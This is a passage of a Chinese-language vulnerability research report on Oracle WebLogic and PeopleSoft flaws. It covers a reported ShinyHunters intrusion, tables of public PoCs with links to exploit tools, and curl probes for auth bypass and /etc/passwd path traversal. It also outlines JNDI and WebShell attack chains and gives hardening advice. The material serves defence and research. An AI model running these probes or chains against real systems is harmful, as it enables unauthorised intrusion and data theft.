    headers:
      Content-Type: application/xml
    body: "<test/>"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
        condition: or
```

### 6.6 实战利用案例

- **ShinyHunters 攻击教育机构**：Mandiant 确认 ShinyHunters 组织利用此漏洞入侵教育机构 PeopleSoft 系统
- **伪装远控驻留**：攻击者在突破后投放伪装成 Azure 运维组件的 MeshCentral agent
- **横向扩散**：利用 SSH 凭据向其他节点批量复制文件和执行命令
- **数据外传**：读取 `psappsrv.cfg`、`config.xml` 等配置文件，打包敏感数据外传

---

## 0x07 公开 PoC 收集与利用思路

### 7.1 PoC 收集情况

| CVE | GitHub PoC | Exploit-DB | Metasploit | Nuclei | 在野利用 |
|-----|-----------|------------|------------|--------|----------|
| CVE-2020-14882 | ✅ 多个仓库 | ✅ | ✅ | ✅ | ✅ 勒索软件 |
| CVE-2020-14883 | ✅ 与 14882 合并 | ✅ | ✅ | ✅ | ✅ |
| CVE-2020-14645 | ✅ ysoserial 生态 | ✅ | ✅ | ✅ | ✅ 挖矿 |
| CVE-2023-21839 | ✅ GUI 工具 | ✅ | 社区模块 | ✅ | ✅ CISA KEV |
| CVE-2021-22915 | ✅ ysoserial 生态 | ✅ | ✅ | ✅ | ✅ 政府目标 |
| CVE-2022-31813 | ✅ 多个仓库 | ✅ | 社区模块 | ✅ | ✅ CISA KEV |
| CVE-2026-35273 | 有限 | ❌ | ❌ | ✅ | ✅ Mandiant 确认 |

### 7.2 关键 PoC 仓库

- **WebLogic 综合利用**：`https://github.com/4ra1y/CVE-2023-21839-GUI` — 图形化 IIOP JNDI 注入工具
- **ysoserial**：`https://github.com/frohoff/ysoserial` — Java 反序列化 gadget 生成器
- **WebLogic 扫描器**：`https://github.com/kingkaki/weblogic-scan` — 综合漏洞扫描
- **marshalsec**：`https://github.com/mbechler/marshalsec` — Java 反序列化研究工具

### 7.3 验证思路（防守型）

```bash
nmap -n -v -Pn -sV target -p 7001,7002,8001,8002 --script=weblogic-t3-info
nuclei -u https://target -t cves/ -tags weblogic,oracle
curl -sk https://target/console/css/%252e%252e%252fconsole.portal -o /dev/null -w "%{http_code}"
curl -sk https://target/forms/lservlet -o /dev/null -w "%{http_code}"
curl -sk "https://target/wls-wsat/CoordinatorPortType/../..%2f..%2fetc/passwd" -o /dev/null -w "%{http_code}"
```

---

## 0x08 共性攻击模式

### 8.1 反序列化是 Oracle 产品的系统性问题

从 2016 年的 CVE-2016-0638 到 2023 年的 CVE-2023-21931，WebLogic 经历了长达 7 年的反序列化漏洞周期。根本原因：

1. **T3/IIOP 协议天然接受序列化对象**：这是 Java RMI 的设计特性，不是 bug
2. **gadget chain 层出不穷**：Commons Collections、Spring、Coherence、C3P0 等第三方库都提供了可用的 gadget
3. **补丁绕过循环**：Oracle 每次添加类黑名单，研究者就找到新的 gadget 绕过

### 8.2 JNDI 注入是新威胁类

CVE-2021-2109 和 CVE-2023-21839 表明 JNDI 远程类加载不仅影响 Log4j，还影响 WebLogic 的核心协议层。攻击模式与 Log4Shell 完全一致：

```
触发 JNDI 查找 → 连接攻击者 LDAP → 返回恶意 Reference → 加载远程类 → RCE
```

### 8.3 认证绕过 + RCE 组合拳

CVE-2020-14882/14883 和 CVE-2026-35273 都遵循同一模式：
1. 找到认证过滤器的路径解析缺陷
2. 绕过认证访问管理功能
3. 利用管理功能执行代码

### 8.4 从路径穿越到完整 RCE

CVE-2022-31813 展示了路径穿越如何升级为完整 RCE：
1. 路径穿越读取 `config.xml` → 获取加密凭据
2. 解密 WebLogic 凭据（已有公开工具）
3. 登录管理控制台
4. 部署恶意 WAR 包
5. 访问 WAR 包中的 WebShell

---

## 0x09 防守建议

### 9.1 紧急措施

1. **关闭不必要的协议端口**：
   - T3/IIOP（7001/7002）不应暴露到互联网
   - 使用防火墙限制仅允许集群内节点访问

2. **限制管理控制台访问**：
   - `/console` 路径仅允许管理网段访问
   - 启用 IP 白名单

3. **关闭 PeopleSoft EMHub**：
   - 单服务器部署直接移除 `PSEMHUB`
   - 多服务器部署优先禁用 EMHub

### 9.2 中期加固

1. **部署 Oracle 官方补丁**：按 Critical Patch Update 周期及时更新
2. **启用 WebLogic 反序列化过滤器**：配置 `weblogic.serialization.filter` 白名单
3. **禁用 JNDI 远程类加载**：设置 `-Djava.rmi.server.useCodebaseOnly=true`
4. **网络分段**：将 Oracle 产品部署在内网，通过反向代理暴露必要服务

### 9.3 长期策略

1. **逐步淘汰遗留产品**：Oracle Forms 11g、WebLogic 10g 已停止主流支持
2. **运行时应用自我保护（RASP）**：部署 RASP 产品监控反序列化和 JNDI 调用
3. **持续监控**：对 T3/IIOP 协议流量进行异常检测
4. **凭据管理**：定期轮换 WebLogic 管理员凭据，使用强密码策略

---

## 0x0A 参考资料

- [Oracle Critical Patch Update Advisories](https://www.oracle.com/security-alerts/cpu/)
- [NVD - Oracle WebLogic](https://nvd.nist.gov/vuln/search/results?query=weblogic)
- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Mandiant: ShinyHunters Targets Education Sector via Oracle Exploit](https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit)
- [ysoserial - Java Deserialization Gadget Generator](https://github.com/frohoff/ysoserial)
- [CVE-2023-21839 GUI Exploit Tool](https://github.com/4ra1y/CVE-2023-21839-GUI)
